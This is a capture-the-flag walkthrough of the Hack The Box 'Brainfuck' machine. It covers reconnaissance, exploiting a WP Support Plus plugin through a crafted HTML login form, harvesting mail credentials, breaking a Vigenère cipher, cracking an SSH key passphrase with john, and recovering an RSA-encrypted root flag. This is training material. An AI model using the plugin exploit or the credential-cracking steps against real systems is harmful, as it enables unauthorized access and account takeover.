# Brainfuck Box 

</br>

## Summary

* Fingerprint: scanning with `nmap` 
* Wordpress analysis: `wpscan`
* Mail (SMTP) : `Mail.app`
* Cipherering: `rumkin.com`
* SSH Key cracking : `john-jumbo`
* RSA decryption: `python`

</br>

## Step #1

```sh
$ nmap -sC -sV -oA ports 10.10.10.17

# -sC : Run safe script on target
# -sV : Try to collect version of softwares
# -oA : Specify output file name
```

```sh
# Nmap 7.70 scan initiated Thu Jun  7 12:22:31 2018 as: nmap -sC -sV -oA ports 10.10.10.17
Nmap scan report for 10.10.10.17
Host is up (0.025s latency).
Not shown: 995 filtered ports
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 94:d0:b3:34:e9:a5:37:c5:ac:b9:80:df:2a:54:a5:f0 (RSA)
|   256 6b:d5:dc:15:3a:66:7a:f4:19:91:5d:73:85:b2:4c:b2 (ECDSA)
|_  256 23:f5:a3:33:33:9d:76:d5:f2:ea:69:71:e3:4e:8e:02 (ED25519)
25/tcp  open  smtp     Postfix smtpd
|_smtp-commands: brainfuck, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN,
110/tcp open  pop3     Dovecot pop3d
|_pop3-capabilities: SASL(PLAIN) AUTH-RESP-CODE UIDL USER TOP CAPA RESP-CODES PIPELINING
143/tcp open  imap     Dovecot imapd
|_imap-capabilities: listed capabilities AUTH=PLAINA0001 have post-login ENABLE Pre-login SASL-IR ID IDLE more IMAP4rev1 LOGIN-REFERRALS OK LITERAL+
443/tcp open  ssl/http nginx 1.10.0 (Ubuntu)
|_http-server-header: nginx/1.10.0 (Ubuntu)
|_http-title: Welcome to nginx!
| ssl-cert: Subject: commonName=brainfuck.htb/organizationName=Brainfuck Ltd./stateOrProvinceName=Attica/countryName=GR
| Subject Alternative Name: DNS:www.brainfuck.htb, DNS:sup3rs3cr3t.brainfuck.htb
| Not valid before: 2017-04-13T11:19:29
|_Not valid after:  2027-04-11T11:19:29
|_ssl-date: TLS randomness does not represent time
| tls-alpn:
|_  http/1.1
| tls-nextprotoneg:
|_  http/1.1
Service Info: Host:  brainfuck; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Jun  7 12:23:17 2018 -- 1 IP address (1 host up) scanned in 46.67 seconds
```

### Data collected:

* DNS Subdomain:
  * `www.brainfuck.htb` : Alias for brainfuck.htb
  * `brainfuck.htb` : Wordpress website
  * `sup3rs3cr3t.brainfuck.htb` : Forum website
* Mail address:
  * `orestis@brainfuck.htb`

</br>

## Step #2

We will start to scan the wordpress website using `wpscan` to find vulnerability and useful informations:

```sh
$ wpscan -u https://brainfuck.htb --disable-tls-checks --enumerate u --log
```

```
[+] WordPress version 4.7.3 (Released on 2017-03-06) identified from links opml, stylesheets numbers, advanced fingerprinting, meta generator
[!] 24 vulnerabilities identified from the version number
		
						[...]

[+] Enumerating plugins from passive detection ...
 | 1 plugin found:

[+] Name: wp-support-plus-responsive-ticket-system - v7.1.3
 |  Last updated: 2018-02-22T07:11:00.000Z
 |  Location: https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/
 |  Readme: https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/readme.txt
[!] The version is out of date, the latest version is 9.0.5
[!] Directory listing is enabled: https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/
```

We can see that the wordpress website use a pluggin named `wp-support-plus-responsive-ticket-system` , we can search for an exploit on ExploitDB:

```sh
$ searchsploit "WP Support Plus"

WordPress Plugin WP Support Plus Responsive Ticket System 2.0 - Multiple Vulnerabilities                                                                                  => exploits/php/webapps/34589.txt

WordPress Plugin WP Support Plus Responsive Ticket System 7.1.3 - Privilege Escalation                                                                                    => exploits/php/webapps/41006.txt

WordPress Plugin WP Support Plus Responsive Ticket System 7.1.3 - SQL Injection                                                                                           => exploits/php/webapps/40939.txt
```

We will try to use the exploit `41006` to gain an admin access to the wordpress website

```sh
# To see the exploit explanation
$ searchsploit -x exploits/php/webapps/41006.txt
```

Modify the exploit to be adapted to our target:

```sh
# File: exploit.html

<form method="post" action="https://brainfuck.htb/wp-admin/admin-ajax.php">
        Username: <input type="text" name="username" value="admin">
        <input type="hidden" name="email" value="orestis@brainfuck.htb">
        <input type="hidden" name="action" value="loginGuestFacebook">
        <input type="submit" value="Login">
</form>
```

```sh
$ python -m SimpleHTTPServer 8080

# Go to http://127.0.0.0:8080/exploit.html and click on login
```

NICE ! We have now a privileged access to the admin page of the wordpress website.

</br>

## Step #3

Since we see that the port we see that the port `25 (SMTP)`, `110 (POP3)` && `143 (IMAP)` are open we will try to find mail credentials of `orestis` :


*  Go to `Settings > Easy WP SMTP` on the sidebar
* Get credentials (password is hidden => WebBrowser console)
* Connect to the mail server with the account obtained (Using Mail.app on OSX)
* Read email => Get Forum account credentials (``sup3rs3cr3t.brainfuck.htb``)

</br>

## Step #4

On this forum, there two thread, on in cleartext (SSH Access) and the other one encrypted (Key). However, orestis use a signature at the end of each messages:

```
Orestis - Hacking for fun and profit
```

That give that on encrypted messages:

```
Pieagnm - Jkoijeg nbw zwx mle grwsnn
```

```
Wejmvse - Fbtkqal zqb rso rnl cwihsf
```

```
Qbqquzs - Pnhekxs dpi fca fhf zdmgzt
```

We can see that is pretty similar syntax with letter substitution. A different key is used for each message encryption, so it is a stream cipher. The key used to encrypt seems to be as long as the plaintext (OTP).

We can use the website `rumen.com` using OTP module to try to find the key:

* Go to http://rumkin.com/tools/cipher/otp.php
* Put an encrypted signature on "Your message"
* Put the plaintext signature on "The pad"
* Decrypt
* `Brainfu - Ckmybra inf uck myb rainfu`

=> The key used to encrypted seems to be `fuckmybrain` successively.

Since this kind of key let me think to vigenere cipher, lets try to decode encrypted message with the rotate key `fuckmybrain` using http://rumkin.com/tools/cipher/vigenere-keyed.php.

```
There you go you stupid fuck, I hope you remember your key password because I dont :)
https://10.10.10.17/8ba5aa10e915218697d1c658cdee0bb8/orestis/id_rsa
```

```
No problem, I'll brute force it ;)
```

=> SSH key get !

</br>

## Step #5

To bruteforce the SSH key passphrase of orestis we will use JohnTheRipper. However, we need first to convert the SSH encrypted key to a john format using `ssh2john` script:

```sh
$ ssh2john id_rsa_orestis > id_rsa_johnformat
```

And then run `john` using the wordlist `rockyou.txt` :

```sh
$ john id_rsa_john --wordlist=~/Documents/HACKING/Wordlist/rockyou.txt
Loaded 1 password hash (SSH-ng [RSA/DSA 32/64])
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:02 14.94% (ETA: 11:11:55) 0g/s 977799p/s 977799c/s 977799C/s 14122516
3poulakia!       (/Users/Panda/Documents/HACKING/playground/htb/Brainfuck/id_rsa_orestis)
1g 0:00:00:13 90.07% (ETA: 11:11:56) 0.07451g/s 968409p/s 968409c/s 968409C/s 1nerual
1g 0:00:00:14 DONE (2018-06-15 11:11) 0.06720g/s 964004p/s 964004c/s 964004C/s *7¡Vamos!
Session completed
# So the passphrase is '3poulakia!'

$ ssh -i ./id_rsa_orestis orestis@10.10.10.17
```

Concequently, we obtain a not privileged shell on the machine.

</br>

## Step #6

In the home folder of `orestis`, we found a script named `encrypt.sage` that perform a RSA encryption of the content of `/root/root.txt`. This script has been run by root and debug and output are contains in two files: `output.txt` & `debug.txt`. 

```python
# File: encrypt.sage

nbits = 1024

password = open("/root/root.txt").read().strip()
enc_pass = open("output.txt","w")
debug = open("debug.txt","w")
m = Integer(int(password.encode('hex'),16))

p = random_prime(2^floor(nbits/2)-1, lbound=2^floor(nbits/2-1), proof=False)
q = random_prime(2^floor(nbits/2)-1, lbound=2^floor(nbits/2-1), proof=False)
n = p*q
phi = (p-1)*(q-1)
e = ZZ.random_element(phi)
while gcd(e, phi) != 1:
    e = ZZ.random_element(phi)

c = pow(m, e, n)
enc_pass.write('Encrypted Password: '+str(c)+'\n')
debug.write(str(p)+'\n')
debug.write(str(q)+'\n')
debug.write(str(e)+'\n')
```

From the script code source and the output/debug file we now know that:

```sh
# VARIABLES

== [P] == 7493025776465062819629921475535241674460826792785520881387158343265274170009282504884941039852933109163193651830303308312565580445669284847225535166520307

== [Q] ==
7020854527787566735458858381555452648322845008266612906844847937070333480373963284146649074252278753696897245898433245929775591091774274652021374143174079

== [E] ==
30802007917952508422792869021689193927485016332713622527025219105154254472344627284947779726280995431947454292782426313255523137610532323813714483639434257536830062768286377920010841850346837238015571464755074669373110411870331706974573498912126641409821855678581804467608824177508976254759319210955977053997

== [C] ==
44641914821074071930297814589851746700593470770417111804648920018396305246956127337150936081144106405284134845851392541080862652386840869768622438038690803472550278042463029816028777378141217023336710545449512973950591755053735796799773369044083673911035030605581144977552865771395578778515514288930832915182
```

In RSA encryption mechanisme, it is possible to retreive the decryption key by using the Extended Euclidian algorithm. However, to make it possible, it is necessarry to know the two prime number `P` and `Q` and the encryption key `E`. In general, because of the large size of this both prime number, it is impossible to bruteforce the algorithm. It is **computational secure**.

Let's run a script to perform the Extended Euclidian algorithm with the variables collected:

```python
# File: decrypt_rsa.py

def egcd(a, b):
    x,y, u,v = 0,1, 1,0
    while a != 0:
        q, r = b//a, b%a
        m, n = x-u*q, y-v*q
        b,a, x,y, u,v = a,r, u,v, m,n
        gcd = b
    return gcd, x, y

def main():

    p = 7493025776465...25535166520307
    q = 70208545277...4143174079
    e = 308020079179...955977053997
    ct = 4464191482...30832915182

    # Compute n
    n = p * q

    # Compute phi(n)
    phi = (p - 1) * (q - 1)

    # Compute modular inverse of e
    gcd, a, b = egcd(e, phi)
    d = a
    print( "Decryption key:  " + str(d) );

    # Decrypt ciphertext
    pt = pow(ct, d, n)
    print( "Plaintext: " + str(pt) )

if __name__ == "__main__":
    main()
```

So, we get a a number that we need to convert to a string hash to validate the flag:

```python
Python 2.7.15 (default, May  2 2018, 12:20:21)
[GCC 4.2.1 Compatible Apple LLVM 9.1.0 (clang-902.0.39.1)] on darwin
Type "help", "copyright", "credits" or "license" for more information.
>>> pt = 24604052029401386049980296953784287079059245867880966944246662849341507003750
>>> str(hex(pt)[2:-1])
'3665666331613564626238393034373531636536353636613330356262386566'
>>> str(hex(pt)[2:-1]).decode('hex')
'6efc1a5dbb8904751ce6566a305bb8ef'
```

